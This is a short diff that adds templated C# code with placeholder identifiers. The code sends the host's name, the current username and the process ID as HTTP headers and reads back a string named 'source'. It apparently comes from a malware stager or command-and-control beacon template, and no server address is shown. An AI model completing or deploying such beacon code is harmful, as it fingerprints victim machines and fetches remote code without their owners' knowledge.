@@ -1,0 +1,8 @@
+HttpClient $variable_pc_1$ = new HttpClient();
+$variable_pc_1$.DefaultRequestHeaders.Add("Hostname", Dns.GetHostName());
+$variable_pc_1$.DefaultRequestHeaders.Add("Username", Environment.UserName);
+$variable_pc_1$.DefaultRequestHeaders.Add("PID", Process.GetCurrentProcess().Id.ToString());
+		
+Task<string> $variable_pc_2$ = $function_name_1$($variable_pc_1$);
+$variable_pc_2$.Wait();
+String $variable_source$ = $variable_pc_2$.Result;
